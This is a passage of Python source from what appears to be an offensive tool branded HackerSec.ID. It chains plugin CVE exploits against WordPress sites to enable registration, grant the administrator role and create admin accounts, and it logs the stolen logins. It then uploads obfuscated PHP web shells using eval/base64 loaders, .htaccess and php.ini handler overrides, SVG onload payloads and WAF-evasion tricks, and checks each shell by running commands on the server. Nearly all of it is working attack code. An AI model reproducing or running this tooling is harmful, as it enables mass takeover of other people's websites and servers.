            if origin_parsed.scheme and origin_parsed.netloc:
                headers[_get_random_header_casing("Origin")] = urlunparse((origin_parsed.scheme, origin_parsed.netloc, '', '', '', ''))
        except Exception:
            pass

    if content_type:
        headers[_get_random_header_casing("Content-Type")] = content_type
    
    if extra_headers:
        for k, v in extra_headers.items():
            headers[_get_random_header_casing(k)] = v
    
    return headers

def save_to_file(filename: str, line: str) -> None:
    """Thread-safe file append."""
    with LOG_LOCK:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(line + "\n")

# --- Payload Obfuscation Utilities (HackerSec.ID CORE) ---
def php_obfuscate_simple(code: str) -> str:
    """Simple PHP obfuscation using base64 and string concatenation."""
    encoded = base64.b64encode(code.encode()).decode()
    parts = [encoded[i:i+random.randint(5, 15)] for i in range(0, len(encoded), random.randint(5, 15))]
    concat_str = '" . "'.join(parts)
    # Add chr() obfuscation for eval and base64_decode function names
    return f'$f1=chr({ord("e")}).chr({ord("v")}).chr({ord("a")}).chr({ord("l")});$f2=chr({ord("b")}).chr({ord("a")}).chr({ord("s")}).chr({ord("e")}).chr({ord("6")}).chr({ord("4")}).chr({ord("_")}).chr({ord("d")}).chr({ord("e")}).chr({ord("c")}).chr({ord("o")}).chr({ord("d")}).chr({ord("e")});@$f1(@$f2("{concat_str}"));'

def php_obfuscate_advanced(code: str) -> str:
    """Advanced PHP obfuscation using gzinflate, base64_decode, and string tricks."""
    compressed = zlib.compress(code.encode(), 9)
    encoded = base64.b64encode(compressed).decode()

    parts = []
    chunk_size = random.randint(20, 40)
    for i in range(0, len(encoded), chunk_size):
        parts.append(f'"{encoded[i:i+chunk_size]}"')
        if random.random() < 0.2:
            parts.append(f'/*{uuid.uuid4().hex[:4]}*/')
    
    obf_func_name_gz = ''.join(random.choice(['g', 'z', 'i', 'n', 'f', 'l', 'a', 't', 'e']))
    obf_func_name_b64 = ''.join(random.choice(['b', 'a', 's', 'e', '6', '4', '_', 'd', 'e', 'c', 'o', 'd', 'e']))
    obf_eval_name = ''.join(random.choice(['e', 'v', 'a', 'l']))

    return (
        f'<?php '
        f'$hs_func1="{obf_func_name_b64}"; $hs_func2="{obf_func_name_gz}"; $hs_eval="{obf_eval_name}"; '
        f'$hs_data=str_replace("/*{uuid.uuid4().hex[:4]}*/", "", '
        f"implode('', [ {','.join(parts)} ])); "
        f'@$hs_eval(@$hs_func2(@$hs_func1($hs_data))); '
        f'?>'
    )

def url_encode_all(data: Union[str, Dict], double_encode: bool = False, random_casing: bool = False) -> Union[str, Dict]:
    """URL-encode all string values in a dict or a string, optionally double encoding, and randomizing key casing."""
    if isinstance(data, str):
        encoded = quote(data, safe='')
        return quote(encoded, safe='') if double_encode else encoded
    elif isinstance(data, dict):
        encoded_data = {}
        for k, v in data.items():
            key = str(k)
            if random_casing:
                key = _get_random_header_casing(key)
            encoded_data[quote(key, safe='')] = url_encode_all(v, double_encode, random_casing)
        return encoded_data
    return data

# ══════════════════════════════════════════════════════════════════════
# BANNER
# ══════════════════════════════════════════════════════════════════════

def render_banner() -> Panel:
    art = r"""
  _____ _   _ _____     ____   ___ ____   __        ____   __  _____ _
 / ____| | | | ____|   |___ \ / _ \___ \ / /_      |___ \ / /_|___ // |
| |    | | | |  _| _____ __) | | | |__) | '_ \ _____ __) | '_ \ |_ \| |
| |___| |_| | |__|_____/ __/| |_| / __/| (_) |_____/ __/| (_) |____/|_|
 \_____\___/|_____|   |_____|\___/_____|\_____/    |_____|\_____/____/|_|
"""
    header = Text(art, justify="center", style="bold red")
    sub = Text(
        "MRG Ultimate Rebuild by HackerSec.ID | Multi-CVE Privesc + Shell Wave\n"
        "Memory Rules Enforced | Dynamic WAF Evasion | Deep Payload Obfuscation | Cmd Upload Shell\n"
        f"CVE Targets: {CVE_RESULT_FILE} | Shells: {SHELL_RESULT_FILE}",
        style="bold white",
        justify="center",
    )
    combined = Text.assemble(header, "\n", sub)
    return Panel(
        Align.center(combined),
        border_style="bright_red",
        box=box.HEAVY,
        padding=(1, 2),
    )

# ══════════════════════════════════════════════════════════════════════
# PHASE 1: CVE Exploitation Logic (HackerSec.ID ULTIMATE ENHANCEMENTS)
# ══════════════════════════════════════════════════════════════════════

def precheck_wp_rest(site: str) -> Tuple[bool, str]:
    """Pre-check: target punya WP REST API? Dengan dynamic WAF headers."""
    session = _get_session()
    urls_to_try = [site, _scheme_flip(site)]
    
    wp_detection_paths = ["/wp-json/", "/wp-login.php", "/wp-admin/", "/readme.html", "/license.txt", "/feed/", "/wp-includes/wlwmanifest.xml"] # Added wlwmanifest.xml

    for base in urls_to_try:
        for path_suffix in wp_detection_paths:
            url = f"{base}{path_suffix}"
            try:
                r = _request_with_retry("get", url, retries=3, flip_scheme=False)
                if r is None: continue

                body = (r.text or "").lower()

                if r.status_code in (200, 301, 302, 401, 403):
                    if "wordpress" in body or "wp-json" in body or "wp-login" in body or "xml" in body and "wordpress" in r.headers.get("X-Powered-By", "").lower():
                        return True, f"wp_ok (status={r.status_code}, path={path_suffix})"
                if r.status_code == 404 and "rest_no_route" in body:
                    return True, f"wp_ok (rest_active_but_namespace_unknown)"
            except requests.exceptions.RequestException:
                continue
    return False, "offline"


def tahap1_reset_secret_multiendpoint(site: str) -> Tuple[bool, str, Dict]:
    """
    TAHAP 1: Ganti kunci (Token) — coba MULTI-ENDPOINT dengan dynamic WAF headers dan payload obfuscation.
    Prioritas: Datalogics > WP Adminify > WPVulnerability.
    """
    results = []
    
    current_cve_secret = uuid.uuid4().hex # Generate a fresh, unique secret for this specific CVE attempt
    
    random.shuffle(TAHAP1_ENDPOINTS) # Randomize the order of endpoints to try

    for ep_config in TAHAP1_ENDPOINTS:
        ep_path = ep_config["path"]
        cve = ep_config["cve"]
        method = ep_config["method"].lower()
        action_field = ep_config["action_field"]
        action_value = ep_config["action_value"]
        token_field = ep_config["token_field"]
        desc = ep_config["desc"]
        
        url = f"{site}{ep_path}"
        
        data_payload = {
            action_field: action_value,
            token_field: current_cve_secret,
        }
        
        content_type = "application/x-www-form-urlencoded"
        kwargs = {"headers": {}}
        
        encoding_choice = random.choice(["form-urlencoded", "json", "json_double_encoded", "mixed_form_json"])
        
        if encoding_choice == "json":
            content_type = "application/json"
            kwargs["json"] = data_payload
        elif encoding_choice == "json_double_encoded":
            content_type = "application/json"
            kwargs["json"] = url_encode_all(data_payload, double_encode=True, random_casing=True)
            kwargs["json"] = json.dumps(kwargs["json"])
        elif encoding_choice == "mixed_form_json":
            content_type = random.choice(["application/json", "application/x-www-form-urlencoded"])
            kwargs["json"] = data_payload
            kwargs["data"] = url_encode_all(data_payload, double_encode=True, random_casing=True)
        else:
            encoded_data = data_payload
            if random.random() < 0.5:
                encoded_data = url_encode_all(data_payload, double_encode=True, random_casing=True)
            
            final_form_data = {}
            for k, v in encoded_data.items():
                final_form_data[_get_random_header_casing(k)] = v
            kwargs["data"] = final_form_data

        if random.random() < 0.3:
            url += f"&{uuid.uuid4().hex[:4]}={uuid.uuid4().hex[:8]}"
        
        kwargs['headers'].update(build_headers(url, content_type=content_type))

        r = _request_with_retry(method, url, **kwargs, flip_scheme=True)
        
        if r is None:
            results.append({"cve": cve, "path": ep_path, "status": "OFFLINE", "code": None, "desc": desc})
            continue
        
        status_code = r.status_code
        body = r.text or ""
        body_lower = body.lower()
        
        is_success = False
        if status_code in (200, 201, 202, 204):
            if not re.search(r"(rest_no_route|invalid|unauthorized|forbidden|error|denied|waf|fail|gagal|error)", body_lower):
                if SUCCESS_OPTION_PATTERN.search(body_lower):
                    is_success = True
                elif status_code == 200 and (len(body.strip()) < 50 or body.strip() == '{}' or body.strip() == '[]' or 'null' in body_lower or body.strip() == ''):
                    is_success = True
        elif status_code == 400 and "option_key" in body_lower and ("already exists" in body_lower or "sudah ada" in body_lower):
            is_success = True
        elif status_code == 200 and "<html>" not in body_lower and "wordpress" not in body_lower and "wp-login" not in body_lower:
            is_success = True

        results.append({
            "cve": cve, "path": ep_path, "status": "OK" if is_success else "FAIL",
            "code": status_code, "desc": desc,
            "body_snippet": body[:100].replace("\n", " ").strip() if not is_success else "",
        })
        
        if is_success:
            return True, f"[TAHAP1_OK] {cve} {ep_path} (status={status_code})", {
                "cve": cve, "path": ep_path, "endpoint": ep_config, "response_code": status_code, "secret": current_cve_secret,
            }
    
    failed_list = "\n".join([
        f"  ├─ [{r['cve']}] {r['path']} | status={r['code'] or 'OFFLINE'} | {r['desc']}"
        for r in results
    ])
    
    return False, f"[TAHAP1_FAIL] Coba {len(TAHAP1_ENDPOINTS)} endpoint, semua gagal:\n{failed_list}", {
        "cve": None, "path": None, "all_attempts": results, "endpoint": None, "secret": None,
    }


def tahap2_set_register(site: str, secret: str, tahap1_endpoint_info: Dict = None) -> Tuple[bool, str]:
    """TAHAP 2: Buka pendaftaran — gunakan endpoint dari TAHAP 1 dengan payload obfuscation."""
    ep = tahap1_endpoint_info.get("endpoint", {})
    url = f"{site}{ep.get('path', '/wp-json/gsf/v1/update-options')}"
    token_field = ep.get("token_field", "shop_secret")
    
    data_payload = {
        "action": "createUpdateOption",
        token_field: secret,
        "option_key": KEY_REGISTER,
        "option_value": VAL_REGISTER,
    }
    
    content_type = "application/x-www-form-urlencoded"
    kwargs = {"headers": {}}
    
    encoding_choice = random.choice(["form-urlencoded", "json", "json_double_encoded", "mixed_form_json"])
    
    if encoding_choice == "json":
        content_type = "application/json"
        kwargs["json"] = data_payload
    elif encoding_choice == "json_double_encoded":
        content_type = "application/json"
        kwargs["json"] = url_encode_all(data_payload, double_encode=True, random_casing=True)
        kwargs["json"] = json.dumps(kwargs["json"])
    elif encoding_choice == "mixed_form_json":
        content_type = random.choice(["application/json", "application/x-www-form-urlencoded"])
        kwargs["json"] = data_payload
        kwargs["data"] = url_encode_all(data_payload, double_encode=True, random_casing=True)
    else:
        encoded_data = data_payload
        if random.random() < 0.5:
            encoded_data = url_encode_all(data_payload, double_encode=True, random_casing=True)
        final_form_data = {}
        for k, v in encoded_data.items():
            final_form_data[_get_random_header_casing(k)] = v
        kwargs["data"] = final_form_data

    kwargs['headers'].update(build_headers(url, content_type=content_type))
    r = _request_with_retry("post", url, **kwargs)
    if r is None:
        return False, f"[OFFLINE] set users_can_register"

    body = r.text or ""
    body_lower = body.lower()

    if (SUCCESS_OPTION_PATTERN.search(body_lower) or r.status_code in (200, 204) and (len(body.strip()) < 50 or body.strip() == '{}' or body.strip() == '[]' or 'null' in body_lower or body.strip() == '')) \
       and not re.search(r"(rest_no_route|invalid|unauthorized|forbidden|error|denied|waf|fail|gagal)", body_lower):
        return True, f"[TAHAP2_OK] users_can_register = {VAL_REGISTER} via {url}"

    if r.status_code == 400 and "option_key" in body_lower and ("already exists" in body_lower or "sudah ada" in body_lower):
        return True, f"[TAHAP2_OK] users_can_register (already set) via {url}"

    return False, f"[TAHAP2_FAIL] status={r.status_code}"


def tahap3_set_admin_role(site: str, secret: str, tahap1_endpoint_info: Dict = None) -> Tuple[bool, str]:
    """TAHAP 3: Jadikan admin — gunakan endpoint dari TAHAP 1 dengan payload obfuscation."""
    ep = tahap1_endpoint_info.get("endpoint", {})
    url = f"{site}{ep.get('path', '/wp-json/gsf/v1/update-options')}"
    token_field = ep.get("token_field", "shop_secret")
    
    data_payload = {
        "action": "createUpdateOption",
        token_field: secret,
        "option_key": KEY_ROLE,
        "option_value": VAL_ROLE,
    }

    content_type = "application/x-www-form-urlencoded"
    kwargs = {"headers": {}}
    
    encoding_choice = random.choice(["form-urlencoded", "json", "json_double_encoded", "mixed_form_json"])
    
    if encoding_choice == "json":
        content_type = "application/json"
        kwargs["json"] = data_payload
    elif encoding_choice == "json_double_encoded":
        content_type = "application/json"
        kwargs["json"] = url_encode_all(data_payload, double_encode=True, random_casing=True)
        kwargs["json"] = json.dumps(kwargs["json"])
    elif encoding_choice == "mixed_form_json":
        content_type = random.choice(["application/json", "application/x-www-form-urlencoded"])
        kwargs["json"] = data_payload
        kwargs["data"] = url_encode_all(data_payload, double_encode=True, random_casing=True)
    else:
        encoded_data = data_payload
        if random.random() < 0.5:
            encoded_data = url_encode_all(data_payload, double_encode=True, random_casing=True)
        final_form_data = {}
        for k, v in encoded_data.items():
            final_form_data[_get_random_header_casing(k)] = v
        kwargs["data"] = final_form_data
    
    kwargs['headers'].update(build_headers(url, content_type=content_type))
    r = _request_with_retry("post", url, **kwargs)
    if r is None:
        return False, f"[OFFLINE] set default_role"

    body = r.text or ""
    body_lower = body.lower()

    if (SUCCESS_OPTION_PATTERN.search(body_lower) or r.status_code in (200, 204) and (len(body.strip()) < 50 or body.strip() == '{}' or body.strip() == '[]' or 'null' in body_lower or body.strip() == '')) \
       and not re.search(r"(rest_no_route|invalid|unauthorized|forbidden|error|denied|waf|fail|gagal)", body_lower):
        return True, f"[TAHAP3_OK] default_role = {VAL_ROLE} via {url}"

    if r.status_code == 400 and "option_key" in body_lower and ("already exists" in body_lower or "sudah ada" in body_lower):
        return True, f"[TAHAP3_OK] default_role (already set) via {url}"

    return False, f"[TAHAP3_FAIL] status={r.status_code}"


def tahap4_verify_registration(site: str) -> Tuple[bool, str]:
    """Verifikasi halaman registrasi terbuka, dengan dynamic WAF headers."""
    url = f"{site}/{WP_REG_PATH}"
    r = _request_with_retry("get", url)
    if r is None:
        return False, "[OFFLINE] reg_check"

    body = r.text or ""

    if r.status_code == 200 and REGISTER_OPEN_PATTERN.search(body):
        return True, "[TAHAP4_VERIFY_OK] registration page open"

    if "registration is currently not allowed" in body.lower() or "registrasi ditutup" in body.lower() or "registrasi tidak diizinkan" in body.lower():
        return False, "[TAHAP4_VERIFY_FAIL] registration_closed"

    return False, f"[TAHAP4_VERIFY_FAIL] status={r.status_code}"


def tahap4_register_admin_user(
    site: str, username: str, email: str, password: str
) -> Tuple[bool, str]:
    """Daftar user baru sebagai admin, dengan dynamic WAF headers."""
    url = f"{site}/{WP_REG_PATH}"

    r_get = _request_with_retry("get", url)
    if r_get is None:
        return False, "[OFFLINE] reg_form"

    body = r_get.text or ""

    nonce_match = re.search(
        r'<input[^>]+name=["\']_wpnonce["\'][^>]*value=["\']([^"\']+)["\']', body, re.IGNORECASE
    ) or re.search(
        r'var\s+\w+Nonce\s*=\s*["\']([^"\']+)["\']', body, re.IGNORECASE
    ) or re.search(
        r'ajaxurl\s*:\s*["\'][^"\']+["\'].*?_wpnonce\s*:\s*["\']([^"\']+)["\']', body, re.IGNORECASE
    ) or re.search(r'_wpnonce=(\w{10})', body, re.IGNORECASE) or re.search(r'name=["\']nonce["\'][^>]*value=["\']([^"\']+)["\']', body, re.IGNORECASE)
    
    nonce = nonce_match.group(1) if nonce_match else ""

    post_data = {
        "user_login": username,
        "user_email": email,
        "_wpnonce": nonce,
        "_wp_http_referer": "/wp-login.php?action=register",
        "redirect_to": "",
        "wp-submit": "Register",
    }
    
    post_data[_get_random_header_casing("user_pass")] = password
    post_data[_get_random_header_casing("user_pass2")] = password
    post_data[_get_random_header_casing("pass1")] = password
    post_data[_get_random_header_casing("pass2")] = password
    post_data[_get_random_header_casing("password")] = password
    post_data[_get_random_header_casing("pwd")] = password
    
    if random.random() < 0.6:
        post_data[f"rand_param_{uuid.uuid4().hex[:4]}"] = uuid.uuid4().hex[:8]
        if random.random() < 0.5:
             post_data[f"rand_data_{uuid.uuid4().hex[:4]}"] = f"value_{random.randint(100, 999)}"

    r_post = _request_with_retry("post", url, data=post_data, headers=build_headers(url))
    if r_post is None:
        return False, "[OFFLINE] reg_post"

    txt = (r_post.text or "").lower()

    if any(s in txt for s in ["registration complete", "check your email", "user registered", "akun berhasil dibuat", "akun terdaftar", "terdaftar"]) \
        or "wp-login.php?checkemail=registered" in r_post.url.lower() or "login_url" in r_post.url.lower():
        return True, f"[TAHAP4_REGISTER_OK] user={username} is ADMIN"

    if "already" in txt and ("exists" in txt or "registered" in txt or "sudah terdaftar" in txt):
        return True, f"[TAHAP4_REGISTER_OK] user_exists (already admin)"

    return False, f"[TAHAP4_REGISTER_FAIL] status={r_post.status_code}"


def cve_worker_thread(
    targets_chunk: List[str],
    log_queue: Queue,
    username: str,
    email: str,
    password: str,
) -> None:
    global VULN_COUNTER_FOR_SHELL_UPLOAD, VULN_TARGETS_FOR_SHELL_UPLOAD

    for raw in targets_chunk:
        site = normalize_site(raw)
        if not site:
            # Add a small delay even for malformed targets to prevent hammering if many are malformed
            time.sleep(random.uniform(INTER_TARGET_DELAY_MIN / 2, INTER_TARGET_DELAY_MAX / 2))
            continue

        ts = time.strftime("%Y-%m-%d %H:%M:%S")

        wp_ok, wp_detail = precheck_wp_rest(site)
        if not wp_ok:
            log_queue.put(("fail", site, wp_detail))
            save_to_file(CVE_FAIL_FILE, f"[FAIL] {ts} | {site} | {wp_detail}")
            # Delay before next target
            time.sleep(random.uniform(INTER_TARGET_DELAY_MIN, INTER_TARGET_DELAY_MAX))
            continue

        ok_t1, detail_t1, tahap1_info = tahap1_reset_secret_multiendpoint(site)
        
        if not ok_t1:
            log_queue.put(("fail", site, f"T1_FAIL (not_vuln)"))
            save_to_file(CVE_FAIL_FILE, f"[FAIL] {ts} | {site} | T1_FAIL (not_vuln)")
            # Delay before next target
            time.sleep(random.uniform(INTER_TARGET_DELAY_MIN, INTER_TARGET_DELAY_MAX))
            continue

        cve_used = tahap1_info.get("cve", "UNKNOWN")
        path_used = tahap1_info.get("path", "???")
        cve_secret_token = tahap1_info.get("secret")
        log_queue.put(("info", site, f"[T1_OK] {cve_used} {path_used}"))

        ok_t2, detail_t2 = tahap2_set_register(site, cve_secret_token, tahap1_info)
        if not ok_t2:
            log_queue.put(("partial", site, "⚠ TAHAP2_FAIL"))
            save_to_file(CVE_FAIL_FILE, f"[PARTIAL] {ts} | {site} | TAHAP2_FAIL")
            time.sleep(random.uniform(INTER_TARGET_DELAY_MIN, INTER_TARGET_DELAY_MAX)) # Delay
            continue

        ok_t3, detail_t3 = tahap3_set_admin_role(site, cve_secret_token, tahap1_info)
        if not ok_t3:
            log_queue.put(("partial", site, "⚠ TAHAP3_FAIL"))
            save_to_file(CVE_FAIL_FILE, f"[PARTIAL] {ts} | {site} | TAHAP3_FAIL")
            time.sleep(random.uniform(INTER_TARGET_DELAY_MIN, INTER_TARGET_DELAY_MAX)) # Delay
            continue

        ok_t4v, detail_t4v = tahap4_verify_registration(site)
        if not ok_t4v:
            log_queue.put(("partial", site, "⚠ TAHAP4_VERIFY_FAIL"))
            save_to_file(CVE_FAIL_FILE, f"[PARTIAL] {ts} | {site} | TAHAP4_VERIFY_FAIL")
            time.sleep(random.uniform(INTER_TARGET_DELAY_MIN, INTER_TARGET_DELAY_MAX)) # Delay
            continue

        ok_t4r, detail_t4r = tahap4_register_admin_user(site, username, email, password)

        if ok_t4r:
            cve_used = tahap1_info.get("cve", "CVE-2026-UNKNOWN")
            line = (
                f"[VULN] {ts} | {site}/wp-login.php | {username}:{password} | {email} | secret={cve_secret_token} | {cve_used}"
            )
            log_queue.put(("success", site, f"PWNED → {username}:{password}"))
            save_to_file(CVE_RESULT_FILE, line)

            newly_pwned_target = {
                "site": site, "user": username, "password": password,
                "email": email, "secret": cve_secret_token,
            }
            with LOG_LOCK:
                VULN_COUNTER_FOR_SHELL_UPLOAD += 1
                VULN_TARGETS_FOR_SHELL_UPLOAD.append(newly_pwned_target)
                if VULN_COUNTER_FOR_SHELL_UPLOAD >= SHELL_UPLOAD_BATCH_SIZE:
                    log_queue.put(("wave", "orchestrator", f"Triggering shell wave for {VULN_COUNTER_FOR_SHELL_UPLOAD} targets..."))
                    SHELL_UPLOAD_QUEUE.put(list(VULN_TARGETS_FOR_SHELL_UPLOAD))
                    VULN_TARGETS_FOR_SHELL_UPLOAD.clear()
                    VULN_COUNTER_FOR_SHELL_UPLOAD = 0

        else:
            log_queue.put(("partial", site, f"⚠ TAHAP4_REGISTER_FAIL: {detail_t4r}"))
            save_to_file(CVE_FAIL_FILE, f"[PARTIAL] {ts} | {site} | TAHAP4_REGISTER_FAIL: {detail_t4r}")
        
        # Delay before next target for both success and failure to maintain stealth
        time.sleep(random.uniform(INTER_TARGET_DELAY_MIN, INTER_TARGET_DELAY_MAX))


# ══════════════════════════════════════════════════════════════════════
# PHASE 2: Shell Upload Logic (HackerSec.ID ULTIMATE ENHANCEMENTS)
# ══════════════════════════════════════════════════════════════════════

def _extract_nonce(html: str, field: str = "_wpnonce") -> str:
    """Extract nonce dari HTML WP admin page, more robustly."""
    m = re.search(
        rf'name=["\']({re.escape(field)})["\'][^>]*value=["\']([^"\']+)["\']',
        html, re.I
    )
    if m:
        return m.group(2)
    m = re.search(rf'["\']({re.escape(field)})["\']:\s*["\']([^"\']+)["\']', html)
    if m:
        return m.group(2)
    m = re.search(r'_wpnonce=([a-f0-9]+)', html)
    if m:
        return m.group(1)
    m = re.search(r'var\s+\w+\s*=\s*{\s*[^}]*?\s*["\']nonce["\']\s*:\s*["\']([a-f0-9]+)["\']', html, re.I)
    if m:
        return m.group(1)
    m = re.search(r'data-nonce=["\']([a-f0-9]+)["\']', html, re.I)
    if m:
        return m.group(1)
    m = re.search(r'"nonce":\s*"([a-f0-9]+)"', html, re.I)
    if m:
        return m.group(1)
    return ""

def verify_shell_3layer(url: str, session: requests.Session) -> str:
    """Verify shell — 3 layer check with existing session."""
    token = f"MRG_{uuid.uuid4().hex[:8]}"
    oxy_url = f"{url}?oxy=init&{uuid.uuid4().hex[:4]}={uuid.uuid4().hex[:6]}" if "?" not in url else f"{url}&oxy=init&{uuid.uuid4().hex[:4]}={uuid.uuid4().hex[:6]}"
    
    try:
        r1 = session.get(oxy_url, timeout=15)
        if r1.status_code == 404: return "DEAD"
        if r1.status_code == 403: return "BLOCKED"
        if r1.status_code not in (200, 500, 503): return "DEAD"
        body1 = r1.text or ""
        if not any(k in body1 for k in ["SH33L", "OxyShellMedan", "oxcommand", "oxy=init", "system", "eval", "passthru", "exec", "shell_exec", "backtick"]):
            return "ZOMBIE"

        r2 = session.post(oxy_url, data={"oxcommand": f"echo {token}"}, timeout=20)
        if token not in (r2.text or ""): return "ZOMBIE"

        r3 = session.post(oxy_url, data={"oxcommand": "whoami"}, timeout=25)
        out = re.sub(r'<[^>]+>', '', r3.text or "")
        for line in out.splitlines():
            line = line.strip()
            if line and len(line) < 50: return "ALIVE"

        return "ZOMBIE"
    except requests.exceptions.RequestException:
        return "DEAD"

def wp_admin_login_for_shell(site: str, username: str, password: str) -> Optional[requests.Session]:
    """Login ke wp-admin dengan dynamic WAF headers. Untuk shell upload."""
    s = _get_session()
    s._creds_user = username
    s._creds_pass = password

    urls_to_try = [f"{site}/wp-login.php", f"{_scheme_flip(site)}/wp-login.php", f"{site}/wp-admin/index.php"]
    
    for login_url in urls_to_try:
        try:
            r_get = s.get(login_url, timeout=TIMEOUT)
            nonce = _extract_nonce(r_get.text or "", "_wpnonce")

            post_data = {
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": f"{site}/wp-admin/",
                "testcookie": "1",
            }
            if nonce: post_data["_wpnonce"] = nonce
            
            if random.random() < 0.5:
                post_data[f"rnd_{uuid.uuid4().hex[:4]}"] = uuid.uuid4().hex[:8]

            r_post = s.post(
                login_url, data=post_data,
                headers=build_headers(login_url),
                timeout=TIMEOUT, allow_redirects=True,
            )

            body = (r_post.text or "").lower()
            url_final = r_post.url.lower()

            if "wp-admin" in url_final or "dashboard" in body or any("wordpress_logged_in" in ck.name for ck in s.cookies):
                save_cookies_js(s, site, username, password)
                return s
            elif "incorrect username or password" in body or "error" in body or "password salah" in body:
                console.print(f"    [dim yellow]  Login attempt failed for {username} at {login_url}.[/dim yellow]")
            elif "too many login attempts" in body or r_post.status_code == 429:
                console.print(f"    [dim yellow]  Login rate limited for {username} at {login_url}.[/dim yellow]")
                time.sleep(RETRY_DELAY * 2)
        except requests.exceptions.RequestException as e:
            console.print(f"    [dim red]  Login attempt failed with exception for {username} at {login_url}: {e}. Resetting session.[/dim red]")
            _thread_local.session = None
            continue
    
    restored_session, _ = load_cookies_from_js(site, username)
    if restored_session:
        _get_session().cookies.update(restored_session.cookies)
        try:
            rv = _get_session().get(f"{site}/wp-admin/", timeout=TIMEOUT, allow_redirects=True)
            if "wp-admin" in rv.url and "wp-login" not in rv.url:
                console.print(f"    [dim green]  Restored session for {username} is active.[/dim green]")
                return _get_session()
        except requests.exceptions.RequestException:
            console.print(f"    [dim yellow]  Restored session for {username} failed to verify.[/dim yellow]")
            pass

    return None

def _upload_shell_via_uploader(uploader_url: str, session: requests.Session, cve_secret_token: str) -> Optional[str]:
    """Stage 2: uploader.php sudah terpasang & verified hidup → upload SHELL_CONTENT (mrg.php) via POST multipart."""
    if not SHELL_CONTENT: return None

    try:
        r = session.get(f"{uploader_url}?p={cve_secret_token}", timeout=15)
        if cve_secret_token not in (r.text or ""):
            console.print(f"    [dim yellow]  Uploader at {uploader_url} not responding with correct secret. Skipping.[/dim yellow]")
            return None

        shell_name_base = os.path.basename(SHELL_LOCAL_PATH).split('.')[0]
        rand = uuid.uuid4().hex[:6]
        
        upload_attempts = [
            f"{shell_name_base}.php",
            f"{shell_name_base}-{rand}.php",
            f"cache-{rand}.phtml",
            f"cache-{rand}.phar",
            f"cache-{rand}.php.jpg",
            f"cache-{rand}.php%00.jpg",
            f"cache-{rand}.jpeg",
            f"{SHELL_THEME_NAME}",
            f"{SHELL_PLUGIN_NAME}",
            f"{SHELL_MU_PLUGIN_NAME}",
            ".htaccess",
            "<?php_?>cache.php",
            "php.ini",
            "index.php",
            f"payload_{uuid.uuid4().hex[:8]}.log",
            f"image_{uuid.uuid4().hex[:8]}.svg",
            f"config_temp_{rand}.php",
            f"uploads/temp_{rand}.php",
        ]
        random.shuffle(upload_attempts)
        base = uploader_url.rsplit("/", 1)[0]

        for fname in upload_attempts:
            content = b""
            ct = "application/octet-stream"

            if fname == ".htaccess":
                htaccess_content = (
                    "AddType application/x-httpd-php .jpg .jpeg .png .gif .phtml .pht .php5 .phar .inc .html .css .js .log .svg\n"
                    "AddHandler application/x-httpd-php .jpg .jpeg .png .gif .phtml .pht .php5 .phar .inc .html .css .js .log .svg\n"
                    '<FilesMatch "\\.(jpg|jpeg|png|gif|phtml|pht|php5|phar|inc|html|css|js|log|svg)$">\n'
                    "  SetHandler application/x-httpd-php\n"
                    "</FilesMatch>\n"
                    "DirectoryIndex " + os.path.basename(SHELL_LOCAL_PATH) + " index.php index.html\n"
                )
                content = htaccess_content.encode()
                ct = "text/plain"
            elif fname == "php.ini":
                phpini_content = "auto_prepend_file = " + os.path.basename(SHELL_LOCAL_PATH) + "\n"
                content = phpini_content.encode()
                ct = "text/plain"
            elif fname.endswith(".svg"):
                svg_shell = f"""<svg xmlns="http://www.w3.org/2000/svg" onload="eval(atob('{base64.b64encode(php_obfuscate_advanced(SHELL_CONTENT).encode()).decode()}'))">"""
                content = svg_shell.encode()
                ct = "image/svg+xml"
            else:
                if random.random() < 0.7:
                    content = php_obfuscate_advanced(SHELL_CONTENT).encode()
                else:
                    content = php_obfuscate_simple(SHELL_CONTENT).encode()
                
                if any(fname.endswith(ext) for ext in [".jpg", ".jpeg", ".png", ".gif"]):
                    ct = "image/jpeg"
                elif fname.endswith(".log"):
                    ct = "text/plain"

            ru = session.post(uploader_url,
                files={"f": (fname, content, ct)},
                data={"k": cve_secret_token, f"rand_param_{uuid.uuid4().hex[:4]}": uuid.uuid4().hex[:8]},
                timeout=45,
                headers=session.headers)
            resp = (ru.text or "").strip()

            if resp.startswith("OK:"):
                uploaded_name = resp[3:].strip()
                shell_url = f"{base}/{uploaded_name}"
                v = verify_shell_3layer(shell_url, session)
                if v in ("ALIVE", "ZOMBIE"):
                    return shell_url
            elif ru.status_code == 403:
                console.print(f"    [dim yellow]  WAF blocked upload of {fname} via uploader. Trying another method.[/dim yellow]")
            elif resp.startswith("ERR:"):
                console.print(f"    [dim yellow]  Uploader reported error for {fname}: {resp}. Trying another method.[/dim yellow]")
    except requests.exceptions.RequestException as e:
        console.print(f"    [dim red]  Uploader failed with exception: {e}. Trying another method.[/dim red]")
    return None

def _extract_uploaded_url(site: str, theme: str, response_text: str, filename: str, session: requests.Session) -> Optional[str]:
    """Extract URL file yang sudah diupload dari response uploader bawaan tema/plugin."""
    if not response_text: return None
    resp = response_text.strip()
    try:
        j = json.loads(resp)
        if isinstance(j, dict):
            for key in ["url", "file_url", "fileurl", "link", "src", "path", "attachment_url", "guid"]:
                if key in j and j[key]:
                    url = j[key]; return url if url.startswith("http") else f"{site}{url}" if url.startswith("/") else f"{site}/{url}"
            for k1 in ["data", "result", "file", "response", "upload"]:
                if k1 in j and isinstance(j[k1], dict):
                    for k2 in ["url", "file_url", "src", "link", "guid"]:
                        if k2 in j[k1] and j[k1][k2]:
                            url = j[k1][k2]; return url if url.startswith("http") else f"{site}{url}" if url.startswith("/") else f"{site}/{url}"
    except (json.JSONDecodeError, ValueError): pass
    m = re.search(r'(https?://[^\s"\'<>]+' + re.escape(filename) + r')', resp)
    if m: return m.group(1)
    m = re.search(r'(/wp-content/[^\s"\'<>]+' + re.escape(filename) + r')', resp)
    if m: return f"{site}{m.group(1)}"
    
    current_year = datetime.datetime.now().strftime("%Y")
    current_month = datetime.datetime.now().strftime("%m")
    common_paths = [
        f"{site}/wp-content/themes/{theme}/{filename}",
        f"{site}/wp-content/plugins/{PLUGIN_SLUG}/{filename}",
        f"{site}/wp-content/uploads/{current_year}/{current_month}/{filename}",
        f"{site}/wp-content/uploads/{current_year}/{filename}",
        f"{site}/wp-content/uploads/{filename}",
        f"{site}/wp-content/mu-plugins/{filename}",
        f"{site}/wp-includes/{filename}",
        f"{site}/{filename}",
        f"{site}/cache/{filename}",
        f"{site}/wp-admin/{filename}",
        f"{site}/images/{filename}",
        f"{site}/files/{filename}",
